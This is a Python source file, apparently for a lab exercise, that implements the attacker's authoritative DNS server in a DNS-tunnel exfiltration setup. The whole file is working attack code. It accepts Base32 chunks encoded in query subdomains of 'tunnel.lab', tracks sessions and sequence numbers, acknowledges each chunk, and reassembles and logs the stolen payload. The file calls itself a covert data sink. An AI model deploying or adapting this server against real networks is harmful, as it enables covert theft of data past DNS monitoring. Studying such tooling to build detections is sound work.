#!/usr/bin/env python3
"""
DNS Tunnel – Attacker-controlled Authoritative Server
======================================================
Authoritative for the zone  tunnel.lab

Query protocol
--------------
  DATA  :  <b32_chunk>.<seq>.<session>.tunnel.lab   → A  1.0.0.1  (ACK)

The server reconstructs the exfiltrated payload by reassembling
ordered Base32 chunks.
"""

import base64
import json
import logging
import os
import threading
import time
from collections import defaultdict

from dnslib import A, QTYPE, RCODE, RR
from dnslib.server import BaseResolver, DNSServer

# ── Logging ───────────────────────────────────────────────────
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [SERVER] %(message)s",
    datefmt="%H:%M:%S",
)
log = logging.getLogger(__name__)

TUNNEL_DOMAIN = "tunnel.lab"
LOG_PATH = "/logs/server_events.jsonl"


class TunnelResolver(BaseResolver):
    """
    DNS resolver that doubles as a covert data sink.

    Incoming query structure:
        <base32_chunk> . <seq_number> . <session_id> . tunnel . lab
        └───────────────────────────────────────────────────────────
                              DATA query
    """

    def __init__(self):
        self._lock = threading.Lock()
        # session_id  →  { seq_int: b32_chunk_str }
        self._sessions: dict[str, dict[int, str]] = defaultdict(dict)
        self._stats = {
            "queries_total": 0,
            "queries_tunnel": 0,
            "bytes_received": 0,
            "start_time": time.time(),
        }
        os.makedirs(os.path.dirname(LOG_PATH), exist_ok=True)
        self._logfile = open(LOG_PATH, "a")

    # ── Core DNS handler ──────────────────────────────────────

    def resolve(self, request, handler):
        qname = str(request.q.qname).rstrip(".")
        labels = qname.split(".")
        reply = request.reply()

        with self._lock:
            self._stats["queries_total"] += 1

        # Only handle our zone
        base = TUNNEL_DOMAIN.split(".")
        if labels[-len(base):] != base:
            reply.header.rcode = RCODE.NXDOMAIN
            return reply

        sub = labels[: -len(base)]  # labels before tunnel.lab

        if not sub:
            reply.add_answer(RR(qname, QTYPE.A, rdata=A("10.10.0.10"), ttl=0))
            return reply

        # ── Data chunk:  <chunk>.<seq>.<session>.tunnel.lab ──
        try:
            if len(sub) >= 3:
                chunk, seq_str, session_id = sub[0], sub[1], sub[2]
            elif len(sub) == 2:
                chunk, seq_str, session_id = sub[0], sub[1], "default"
            else:
                raise ValueError("too few labels")

            seq = int(seq_str)

            with self._lock:
                self._sessions[session_id][seq] = chunk
                self._stats["queries_tunnel"] += 1

            self._log_event(
                {"type": "data", "session": session_id, "seq": seq, "chunk": chunk}
            )
            log.info(f"← [{session_id}] seq={seq:03d}  chunk={chunk[:25]}…")

            # ACK: 1.0.0.1
            reply.add_answer(RR(qname, QTYPE.A, rdata=A("1.0.0.1"), ttl=0))

        except (ValueError, IndexError) as exc:
            log.warning(f"Malformed query: {qname}  ({exc})")
            reply.header.rcode = RCODE.SERVFAIL

        return reply

    # ── Helpers ───────────────────────────────────────────────

    def get_decoded(self, session_id: str = "default") -> bytes | None:
        """Reassemble all buffered chunks and decode Base32."""
        with self._lock:
            buf = dict(self._sessions.get(session_id, {}))
        if not buf:
            return None
        joined = "".join(buf[k] for k in sorted(buf)).upper()
        pad = (8 - len(joined) % 8) % 8
        try:
            return base64.b32decode(joined + "=" * pad)
        except Exception as exc:
            log.error(f"Decode error: {exc}")
            return None

    def print_stats(self):
        with self._lock:
            s = dict(self._stats)
        uptime = time.time() - s["start_time"]
        log.info(
            f"[stats] uptime={uptime:.0f}s | "
            f"total={s['queries_total']} | "
            f"tunnel={s['queries_tunnel']}"
        )

    def _log_event(self, event: dict):
        event["ts"] = time.time()
        self._logfile.write(json.dumps(event) + "\n")
        self._logfile.flush()


# ── Entry point ───────────────────────────────────────────────

if __name__ == "__main__":
    resolver = TunnelResolver()
    server = DNSServer(resolver, port=53, address="0.0.0.0", tcp=False)
    server.start_thread()
    log.info(f"Authoritative DNS server started – zone: {TUNNEL_DOMAIN}")

    try:
        while True:
            time.sleep(10)
            resolver.print_stats()
            # Print any decoded data received
            data = resolver.get_decoded()
            if data:
                log.info(f"[DECODED PAYLOAD] {data.decode('utf-8', errors='replace')!r}")
    except KeyboardInterrupt:
        server.stop()
        log.info("Server stopped.")
